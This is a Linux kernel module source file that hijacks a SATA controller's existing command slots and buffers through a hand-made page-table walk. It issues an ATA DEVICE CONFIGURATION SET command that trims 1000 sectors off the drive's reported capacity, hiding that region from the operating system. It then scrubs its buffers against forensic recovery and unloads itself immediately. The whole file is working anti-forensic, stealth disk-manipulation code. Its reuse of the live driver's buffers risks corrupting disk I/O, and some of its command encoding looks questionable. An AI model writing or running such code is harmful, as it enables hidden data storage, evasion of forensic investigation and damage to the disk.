#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/mm.h>
#include <linux/pci.h>
#include <linux/highmem.h>
#include <asm/pgtable.h>
#include <asm/processor.h>
#include <asm/cacheflush.h>

/* ------------------------------------------------------------------ *
 *  AHCI Port Configuration & Constants
 * ------------------------------------------------------------------ */
#define VBOX_AHCI_FALLBACK_PHYS 0xe1900000ULL  /* Fallback ABAR for VirtualBox */
#define AHCI_PORT_NUM     0
#define AHCI_PORT_BASE    (0x100 + (AHCI_PORT_NUM) * 0x80)
#define AHCI_ABAR_SIZE    0x1000

/* Port register offsets */
#define AHCI_PxCLB        0x00
#define AHCI_PxCLBU       0x04
#define AHCI_PxIS         0x10
#define AHCI_PxIE         0x14
#define AHCI_PxCMD        0x18
#define AHCI_PxTFD        0x20
#define AHCI_PxSSTS       0x28
#define AHCI_PxSERR       0x30
#define AHCI_PxCI         0x38

#define PxIS_TFES         (1U << 30)

#define NATIVE_MAX_LBA    2097152ULL
#define TAIL_TRIM_SECTORS 1000ULL
#define STEALTH_MAX_LBA   (NATIVE_MAX_LBA - TAIL_TRIM_SECTORS)
#define TARGET_INSPECT_LBA (NATIVE_MAX_LBA - 1ULL)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System Researcher");
MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module via Pre-allocated Buffers");

struct sata_fis_h2d {
    u8 fis_type;
    u8 pm_port_c;
    u8 command;
    u8 feature_low;
    u8 lba0, lba1, lba2, device;
    u8 lba3, lba4, lba5, feature_high;
    u8 count_low, count_high, icc, control;
    u8 aux[4];
} __packed;

struct ahci_cmd_header {
    u32 dw0;
    u32 dw1;
    u32 ctba;
    u32 ctbau;
    u32 reserved[4];
} __packed;

struct ahci_prdt_entry {
    u32 dba;
    u32 dbau;
    u32 reserved;
    u32 dbc;
} __packed;

/* ------------------------------------------------------------------ *
 *  Manual Direct Page Table Walk Engine via CR3 Hardware Register
 * ------------------------------------------------------------------ */
static void __iomem *manual_direct_map(unsigned long phys_addr)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    unsigned long pfn;
    struct page *page;
    unsigned long cr3;
    pgd_t *pgd_base;
    unsigned long virt_addr;

    virt_addr = (unsigned long)__va(phys_addr);

    cr3 = read_cr3_pa();
    pgd_base = (pgd_t *)__va(cr3 & PAGE_MASK);
    
    pgd = pgd_base + pgd_index(virt_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        return NULL;

    p4d = p4d_offset(pgd, virt_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        return NULL;

    pud = pud_offset(p4d, virt_addr);
    if (pud_none(*pud) || pud_bad(*pud))
        return NULL;

    pmd = pmd_offset(pud, virt_addr);
    if (pmd_none(*pmd))
        return NULL;

#ifdef _PAGE_PSE
    if (pmd_val(*pmd) & _PAGE_PSE) {
        pfn = pmd_pfn(*pmd) + (virt_addr & ~PMD_MASK) / PAGE_SIZE;
        page = pfn_to_page(pfn);
        return (void __iomem *)page_address(page) + (virt_addr & ~PAGE_MASK);
    }
#elif defined(_PAGE_BIT_PSE)
    if (pmd_val(*pmd) & (1UL << _PAGE_BIT_PSE)) {
        pfn = pmd_pfn(*pmd) + (virt_addr & ~PMD_MASK) / PAGE_SIZE;
        page = pfn_to_page(pfn);
        return (void __iomem *)page_address(page) + (virt_addr & ~PAGE_MASK);
    }
#endif

    pte = pte_offset_kernel(pmd, virt_addr);
    if (pte_none(*pte) || !pte_present(*pte))
        return NULL;

    pfn = pte_pfn(*pte);
    page = pfn_to_page(pfn);

    return (void __iomem *)(page_address(page) + (virt_addr & ~PAGE_MASK));
}

/* ------------------------------------------------------------------ *
 *  Hardware PCI ABAR Resolution via ioremap
 * ------------------------------------------------------------------ */
static void __iomem *get_stealth_abar_mmio(void)
{
    struct pci_dev *pdev = NULL;
    resource_size_t abar_phys;
    void __iomem *mmio = NULL;

    pr_info("[STEALTH_DCO] [*] Initiating PCI ABAR discovery...\n");

    while ((pdev = pci_get_class(PCI_CLASS_STORAGE_SATA << 8, pdev)) != NULL) {
        abar_phys = pci_resource_start(pdev, 5);
        if (abar_phys) {
            pr_info("[STEALTH_DCO] [+] Found SATA controller %s with BAR5 at 0x%llx\n",
                    pci_name(pdev), (unsigned long long)abar_phys);
            
            mmio = ioremap(abar_phys, AHCI_ABAR_SIZE);
            if (mmio) {
                pci_dev_put(pdev);
                return mmio;
            }
        }
    }

    pr_warn("[STEALTH_DCO] [!] Dynamic scan missed BAR5. Applying static fallback map: 0x%llx\n", 
            VBOX_AHCI_FALLBACK_PHYS);
    
    mmio = ioremap(VBOX_AHCI_FALLBACK_PHYS, AHCI_ABAR_SIZE);
    if (mmio) {
        pr_info("[STEALTH_DCO] [+] Successfully resolved fallback ABAR.\n");
        return mmio;
    }

    pr_err("[STEALTH_DCO] [-] FATAL: Hardware ABAR resolution failed.\n");
    return NULL;
}

/* ------------------------------------------------------------------ *
 *  Helper: Robust slot execution with verbose status logging
 * ------------------------------------------------------------------ */
static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
{
    u32 ie_orig, ci_val, tfd_val, serr_val;
    int i, max_polls = is_dco_set ? 300 : 100;

    pr_info("[STEALTH_DCO] [+] Preparing slot %d execution (DCO Set: %s)\n", slot, is_dco_set ? "YES" : "NO");

    ie_orig = readl((char *)port_base + AHCI_PxIE);
    writel(0, (char *)port_base + AHCI_PxIE);
    wmb();

    ci_val = readl((char *)port_base + AHCI_PxCI);
    ci_val |= (1U << slot);
    writel(ci_val, (char *)port_base + AHCI_PxCI);
    wmb();

    for (i = 0; i < max_polls; i++) {
        u32 current_ci = readl((char *)port_base + AHCI_PxCI);
        tfd_val = readl((char *)port_base + AHCI_PxTFD);

        if (!(current_ci & (1U << slot)) || !(tfd_val & 0x88)) {
            pr_info("[STEALTH_DCO] [+] Slot %d completed at poll iteration %d. PxTFD: 0x%08x\n", slot, i, tfd_val);

            writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
            
            serr_val = readl((char *)port_base + AHCI_PxSERR);
            writel(serr_val, (char *)port_base + AHCI_PxSERR);
            wmb();

            writel(ie_orig, (char *)port_base + AHCI_PxIE);
            wmb();

            return 0;
        }
        msleep(10);
    }
    
    pr_err("[STEALTH_DCO] [-] ERROR: Slot %d timed out! PxTFD: 0x%08x\n", slot, readl((char *)port_base + AHCI_PxTFD));
    
    writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
    writel(ie_orig, (char *)port_base + AHCI_PxIE);
    wmb();

    return -ETIMEDOUT;
}

/* ------------------------------------------------------------------ *
 *  Init (Zero-Allocation Transient Execution via Reused Controller Buffers)
 * ------------------------------------------------------------------ */
static int __init ahci_stealth_dco_init(void)
{
    void __iomem *abar_base = NULL;
    void *port_base = NULL;
    void __iomem *slot0_virt = NULL;
    void __iomem *slot31_virt = NULL;
    void __iomem *ctba_virt = NULL;
    void __iomem *data_virt = NULL;

    struct sata_fis_h2d    *fis;
    struct ahci_cmd_header *hdr0, *hdr31;
    struct ahci_prdt_entry *prdt0, *prdt31;

    u64 lst_phys = 0, slot0_ctba_phys = 0, slot31_ctba_phys = 0, data_phys = 0;
    u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val;
    int ret = 0;
    u8 *sector_buf;

    pr_info("[STEALTH_DCO] ==================================================\n");
    pr_info("[STEALTH_DCO] ---- ZERO-ALLOCATION REUSED BUFFER DCO START ----\n");
    pr_info("[STEALTH_DCO] ==================================================\n");

    abar_base = get_stealth_abar_mmio();
    if (!abar_base) {
        pr_err("[STEALTH_DCO] FATAL: Failed to acquire ABAR mapping\n");
        return -ENODEV;
    }
    port_base = (void *)((char *)abar_base + AHCI_PORT_BASE);

    ssts_val = readl((char *)port_base + AHCI_PxSSTS);
    pr_info("[STEALTH_DCO] [*] Port SStatus (PxSSTS): 0x%08x\n", ssts_val);

    clb_lo = readl((char *)port_base + AHCI_PxCLB);
    clb_hi = readl((char *)port_base + AHCI_PxCLBU);
    lst_phys = ((u64)clb_hi << 32) | clb_lo;
    if (!lst_phys) {
        pr_err("[STEALTH_DCO] FATAL: PxCLB is 0, port uninitialized\n");
        ret = -ENODEV;
        goto out;
    }

    cmd_val = readl((char *)port_base + AHCI_PxCMD);
    cmd_val |= (1U << 0) | (1U << 4);
    writel(cmd_val, (char *)port_base + AHCI_PxCMD);
    wmb();

    /* Resolve pre-allocated buffers from existing controller slot structures */
    slot0_virt = manual_direct_map(lst_phys + (0 * 32));
    slot31_virt = manual_direct_map(lst_phys + (31 * 32));
    if (!slot0_virt || !slot31_virt) {
        pr_err("[STEALTH_DCO] FATAL: manual_direct_map failed for command slots\n");
        ret = -EFAULT;
        goto out;
    }

    hdr0 = (struct ahci_cmd_header *)slot0_virt;
    slot0_ctba_phys = ((u64)hdr0->ctbau << 32) | hdr0->ctba;

    hdr31 = (struct ahci_cmd_header *)slot31_virt;
    slot31_ctba_phys = ((u64)hdr31->ctbau << 32) | hdr31->ctba;

    if (!slot0_ctba_phys || !slot31_ctba_phys) {
        pr_err("[STEALTH_DCO] FATAL: Pre-allocated CTBA addresses are invalid\n");
        ret = -EFAULT;
        goto out;
    }

    ctba_virt = manual_direct_map(slot31_ctba_phys);
    if (!ctba_virt) {
        pr_err("[STEALTH_DCO] FATAL: Failed to map slot 31 CTBA\n");
        ret = -EFAULT;
        goto out;
    }

    /* Borrow pre-allocated data buffer from slot 0's PRDT entry */
    prdt0 = (struct ahci_prdt_entry *)((char *)manual_direct_map(slot0_ctba_phys) + 0x80);
    data_phys = ((u64)prdt0->dbau << 32) | prdt0->dba;
    if (!data_phys) {
        /* Fallback: use slot 0's CTBA area or command list page as temporary scratchpad */
        data_phys = slot0_ctba_phys + 0x100;
    }

    data_virt = manual_direct_map(data_phys);
    if (!data_virt) {
        pr_err("[STEALTH_DCO] FATAL: Failed to map pre-allocated data buffer\n");
        ret = -EFAULT;
        goto out;
    }

    memset((void *)ctba_virt, 0, 256);
    memset((void *)data_virt, 0, 512);

    /* Phase 1: Inspect Tail Sector */
    pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) ---\n", (unsigned long long)TARGET_INSPECT_LBA);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0x25; /* READ DMA EXT */
    fis->lba0        = (u8)(TARGET_INSPECT_LBA & 0xFF);
    fis->lba1        = (u8)((TARGET_INSPECT_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((TARGET_INSPECT_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((TARGET_INSPECT_LBA >> 24) & 0xFF);
    fis->lba4        = (u8)((TARGET_INSPECT_LBA >> 32) & 0xFF);
    fis->lba5        = (u8)((TARGET_INSPECT_LBA >> 40) & 0xFF);
    fis->count_low   = 0x01;

    prdt31 = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
    prdt31->dba  = (u32)(data_phys & 0xFFFFFFFF);
    prdt31->dbau = (u32)(data_phys >> 32);
    prdt31->dbc  = (511 & 0x3FFFFF);

    hdr31->dw0   = (5 & 0x1F) | (1 << 16); 
    hdr31->dw1   = 0;
    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
    wmb();

    if (execute_ahci_slot_stealth(port_base, 31, false) == 0) {
        sector_buf = (u8 *)data_virt;
        if (*(u64 *)sector_buf == 0x5452415020494645ULL) {
            pr_warn("[STEALTH_DCO] [+] GPT Backup Header detected at tail boundary.\n");
        } else {
            pr_info("[STEALTH_DCO] [+] Tail sector verified successfully.\n");
        }
    } else {
        ret = -EIO;
        goto out;
    }

    /* Phase 2: DCO Micro-Trim */
    pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) ---\n", (unsigned long long)STEALTH_MAX_LBA);
    memset((void *)ctba_virt, 0, 256);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0xB1; /* DEVICE CONFIGURATION */
    fis->feature_low = 0xC2; /* SET */
    fis->lba0        = (u8)(STEALTH_MAX_LBA & 0xFF);
    fis->lba1        = (u8)((STEALTH_MAX_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((STEALTH_MAX_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
    fis->count_low   = 0x01;

    hdr31->dw0   = (5 & 0x1F) | (0 << 16); 
    hdr31->dw1   = 0;
    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
    wmb();

    if (execute_ahci_slot_stealth(port_base, 31, true) == 0) {
        pxis_after = readl((char *)port_base + AHCI_PxIS);
        if (pxis_after & PxIS_TFES) {
            pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
            ret = -EIO;
        } else {
            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via pre-allocated buffers.\n");
            ret = 0;
        }
    } else {
        ret = -EIO;
    }

out:
    if (abar_base)
        iounmap(abar_base);

    /* Forensic Memory Scrubbing & Cache Sanitization on Reused Buffers */
    if (ctba_virt) {
        clflush_cache_range((void *)ctba_virt, 256);
        memzero_explicit((void *)ctba_virt, 256);
        clflush_cache_range((void *)ctba_virt, 256);
    }
    if (data_virt) {
        clflush_cache_range((void *)data_virt, 512);
        memzero_explicit((void *)data_virt, 512);
        clflush_cache_range((void *)data_virt, 512);
    }
    
    pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);

    return (ret == 0) ? -ENODEV : ret;
}

static void __exit ahci_stealth_dco_exit(void) {}

module_init(ahci_stealth_dco_init);
module_exit(ahci_stealth_dco_exit);